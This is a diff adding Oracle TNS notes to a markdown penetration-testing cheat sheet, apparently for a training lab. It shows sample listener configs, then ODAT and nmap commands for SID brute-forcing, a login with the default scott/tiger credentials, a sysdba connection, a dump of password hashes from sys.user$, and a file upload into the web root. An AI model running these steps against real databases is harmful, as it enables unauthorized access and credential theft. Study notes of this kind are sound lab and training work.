@@ -620,3 +620,145 @@ We can also use mssql_ping from metasploit `auxiliary/scanner/mssql/mssql_ping`
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 ```
 
+# Oracle TNS
+`Oracle Transparent Network Substrate`
+
+Oracle 8i/9i can be remotely managed but not 10g/1g
+
+Default: `ORACLE_HOME/network/admin`
+`tnsnames.ora `
+`listener.ora`
+
+<b>This is how a Tnsnames.ora looks like `TCP/1521`:</b>
+
+    ORCL =
+    (DESCRIPTION =
+        (ADDRESS_LIST =
+        (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+        )
+        (CONNECT_DATA =
+        (SERVER = DEDICATED)
+        (SERVICE_NAME = orcl)
+        )
+    )
+
+<b>Listener.ora:</b>
+
+    SID_LIST_LISTENER =
+    (SID_LIST =
+        (SID_DESC =
+        (SID_NAME = PDB1)
+        (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+        (GLOBAL_DBNAME = PDB1)
+        (SID_DIRECTORY_LIST =
+            (SID_DIRECTORY =
+            (DIRECTORY_TYPE = TNS_ADMIN)
+            (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
+            )
+        )
+        )
+    )
+
+    LISTENER =
+    (DESCRIPTION_LIST =
+        (DESCRIPTION =
+        (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+        (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+        )
+    )
+
+    ADR_BASE_LISTENER = C:\oracle
+
+Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.
+
+    Setting 	Description
+    DESCRIPTION 	A descriptor that provides a name for the database and its connection type.
+    ADDRESS 	The network address of the database, which includes the hostname and port number.
+    PROTOCOL 	The network protocol used for communication with the server
+    PORT 	The port number used for communication with the server
+    CONNECT_DATA 	Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.
+    INSTANCE_NAME 	The name of the database instance the client wants to connect.
+    SERVICE_NAME 	The name of the service that the client wants to connect to.
+    SERVER 	The type of server used for the database connection, such as dedicated or shared.
+    USER 	The username used to authenticate with the database server.
+    PASSWORD 	The password used to authenticate with the database server.
+    SECURITY 	The type of security for the connection.
+    VALIDATE_CERT 	Whether to validate the certificate using SSL/TLS.
+    SSL_VERSION 	The version of SSL/TLS to use for the connection.
+    CONNECT_TIMEOUT 	The time limit in seconds for the client to establish a connection to the database.
+    RECEIVE_TIMEOUT 	The time limit in seconds for the client to receive a response from the database.
+    SEND_TIMEOUT 	The time limit in seconds for the client to send a request to the database.
+    SQLNET.EXPIRE_TIME 	The time limit in seconds for the client to detect a connection has failed.
+    TRACE_LEVEL 	The level of tracing for the database connection.
+    TRACE_DIRECTORY 	The directory where the trace files are stored.
+    TRACE_FILE_NAME 	The name of the trace file.
+    LOG_FILE 	The file where the log information is stored.
+
+<b>Here is a bash script that does al of that:</b>
+```bash
+#!/bin/bash
+
+sudo apt-get install libaio1 python3-dev alien python3-pip -y
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+git submodule init
+sudo submodule update
+sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
+sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
+```
+
+<b>Testing ODAT (pentest tool written in Python)</b>
+```bash
+./odat.py -h
+
+# map service
+sudo nmap -p1521 -sV 10.129.204.235 --open
+```
+
+There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like nmap, hydra, odat, and others. Let us use nmap first.
+
+```bash
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+./odat.py all -s 10.129.204.235
+```
+
+In this example, we found valid credentials for the user scott and his password tiger. After that, we can use the tool sqlplus to connect to the Oracle database and interact with it.
+
+```bash
+sqlplus scott/tiger@10.129.204.235/XE;
+```
+
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
+
+
+[SQL command enumerate databases](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
+
+<b>Oracle RDBMS - Database Enumeration</b>
+```bahs
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+
+<b>Extract pw hashes</b>
+```bash
+SQL> select name, password from sys.user$;
+```
+
+<b>Default paths</b>
+```bash
+OS 	Path
+Linux 	/var/www/html
+Windows 	C:\inetpub\wwwroot
+```
+
+<b>Oracle RDBMS - File Upload</b>
+```bash
+echo "Oracle File Upload Test" > testing.txt
+
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+curl -X GET http://10.129.204.235/testing.txt
+```
